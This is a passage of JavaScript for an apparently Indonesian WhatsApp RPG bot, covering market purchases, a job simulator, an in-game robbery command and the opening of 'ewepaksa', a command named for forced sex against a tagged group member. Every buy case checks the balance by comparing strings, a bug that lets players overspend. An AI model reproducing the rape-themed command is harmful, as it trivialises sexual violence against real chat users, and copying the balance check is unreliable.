if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].plastik += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Plastik: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'banteng': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 30000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].banteng += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Banteng: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gajah': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 70000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].gajah += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Gajah: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'harimau': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 100000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].harimau += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Harimau: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kambing': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 30000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kambing += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kambing: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'panda': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 40000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].panda += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Panda: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'buaya': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].buaya += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Buaya: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kerbau': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 40000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kerbau += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kerbau: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'monyet': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].monyet += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Monyet: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'babihutan': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].babihutan += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Babi Hutan: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'babi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].babi += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Babi: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'limit': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 10000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        db.users[m.sender].limit += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Limit: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'glimit':
      case 'gamelimit': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 10000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        db.users[m.sender].glimit += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Game Limit: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'paus': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 78000500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].paus += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Paus: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kepiting': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kepiting += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kepiting: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gurita': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].gurita += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Gurita: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'cumi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].cumi += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Cumi: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'buntal': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].buntal += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Buntal: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'dory': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 7000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].dory += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Dory: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'lumba': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 674000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].lumba += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Lumba": ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'lobster': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].lobster += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Lobster: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'hiu': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 8750000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].hiu += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Hiu: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'udang': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].udang += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Udang: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'orca': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 12000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].orca += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Orca: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'potion': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].potion += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Potion: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      default:
        let teks = `------- » *🛍️ MARKET 🛍️* « -------


*Sumber Daya 🧰*
  ${vircion} • rumah -Rp 2.000.000
  ${vircion} • potion -Rp 1.000
  ${vircion} • Limit: -Rp 1000 1.000
  ${vircion} • GameLimit: -Rp 1.000
  ${vircion} • emas -Rp 20.500
  ${vircion} • besi -Rp 1.500
  ${vircion} • batubara -Rp 1.000
  ${vircion} • perak -Rp 2.000
  ${vircion} • kayu -Rp 500
  ${vircion} • emerald -Rp 20.000
  ${vircion} • diamond -Rp 50.000
  ${vircion} • botol -Rp 200
  ${vircion} • kardus -Rp 200
  ${vircion} • kaleng -Rp 200
  ${vircion} • gelas -Rp 200
  ${vircion} • plastik -Rp 200

*Hewan Darat🌿*
  ${vircion} • ayam -Rp 500
  ${vircion} • sapi -Rp 3.000
  ${vircion} • domba -Rp 2.000
  ${vircion} • banteng -Rp 30.000
  ${vircion} • gajah -Rp 70.000
  ${vircion} • harimau -Rp 100.000
  ${vircion} • kambing -Rp 30000
  ${vircion} • panda -Rp 40.000
  ${vircion} • buaya -Rp 20.000
  ${vircion} • kerbau -Rp 40.000
  ${vircion} • monyet -Rp 20.000
  ${vircion} • babihutan -Rp 40.000
  ${vircion} • babi -Rp 20.000

*Hewan Laut 🌊*
  ${vircion} • ikan -Rp 200
  ${vircion} • paus -Rp 78000500
  ${vircion} • kepiting -Rp 2000
  ${vircion} • gurita -Rp 3000
  ${vircion} • cumi -Rp 2000
  ${vircion} • buntal -Rp 1000
  ${vircion} • dory -Rp 7000
  ${vircion} • lumba -Rp 674000
  ${vircion} • lobster -Rp 3000
  ${vircion} • hiu -Rp 8750000
  ${vircion} • udang -Rp 1000
  ${vircion} • orca -Rp 12000
_____________________________

*Tutorials :*
➠ To Buy Items:
.buy [item] [quantity]
▧ Example:
.buy emas 10`
        sock.sendMessage(m.chat, {
          text: teks,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "BUY MARKET",
              body: 'Sell goods to earn money',
              thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break

    case 'bekerja':
    case 'kerja': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let type = (args[0] || '').toLowerCase()
      let time = global.db.erpg[m.sender].lastkerja + 600000
      let __timers = (new Date - global.db.erpg[m.sender].lastkerja)
      let _timers = (0 - __timers)
      let timers = clockString(_timers)
      let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
      let penumpang = await pickRandom(penumpan)
      let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
      let dagangan = await pickRandom(daganga)
      let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
      let pasien = await pickRandom(pasie)
      let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
      let panen = await pickRandom(pane)
      let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
      let bengkel = await pickRandom(bengke)
      let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
      let rumah = await pickRandom(ruma)

      switch (type) {
      case 'ojek':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
        let hasilojek = Math.floor(Math.random() * 10000)
        m.reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} 💰*`).then(() => {
          db.users[m.sender].saldo += hasilojek
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'pedagang':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
        let hasildagang = Math.floor(Math.random() * 10000)
        m.reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} 💰*`).then(() => {
          db.users[m.sender].saldo += hasildagang
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'dokter':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
        let hasildokter = Math.floor(Math.random() * 10000)
        m.reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* 💰`).then(() => {
          db.users[m.sender].saldo += hasildokter
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'petani':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
        let hasiltani = Math.floor(Math.random() * 10000)
        m.reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} 💰*`).then(() => {
          db.users[m.sender].saldo += hasiltani
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'montir':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
        let hasilmontir = Math.floor(Math.random() * 10000)
        m.reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* 💰`).then(() => {
          db.users[m.sender].saldo += hasilmontir
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'kuli':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
        let hasilkuli = Math.floor(Math.random() * 10000)
        m.reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} 💰*`).then(() => {
          db.users[m.sender].saldo += hasilkuli
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      default:
        let teks = `
*💼 RPG - KERJA 💼*

*Select you job* :
  ${vircion} • montir
  ${vircion} • kuli
  ${vircion} • petani
  ${vircion} • dokter
  ${vircion} • pedagang
  ${vircion} • ojek

*Contoh* :
${cmd} kuli`
        sock.sendMessage(m.chat, {
          text: teks,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - JOB SIMULATOR",
              body: 'Choose a job and enjoy the results',
              thumbnailUrl: "https://pomf2.lain.la/f/x1pvc1mq.jpg",
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break


    case 'merampok':
    case 'rampok': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!m.isGroup) return onlyGrup()
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let hasil = (Math.floor(Math.random() * 5000))
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`*Tag/Reply Target!*\n\nContoh :\n${cmd} @0`)
      if (users == m.sender) return m.reply("Gak bisa ngerampok diri sendiri")
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrampok)
      if (new Date() - global.db.erpg[m.sender].lastrampok < 3600000) return m.reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
      if (db.users[users].saldo < 5000) return m.reply("Target kismin")
      db.users[users].saldo -= hasil * 1
      db.users[m.sender].saldo += hasil * 1
      global.db.erpg[m.sender].lastrampok = new Date * 1
      m.reply(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
    }
    break

    case 'ewepaksa':
    case 'ewe-paksa': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!m.isGroup) return onlyGrup()
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`*Tag/Reply Target!*\n\nContoh :\n${cmd} @0`)
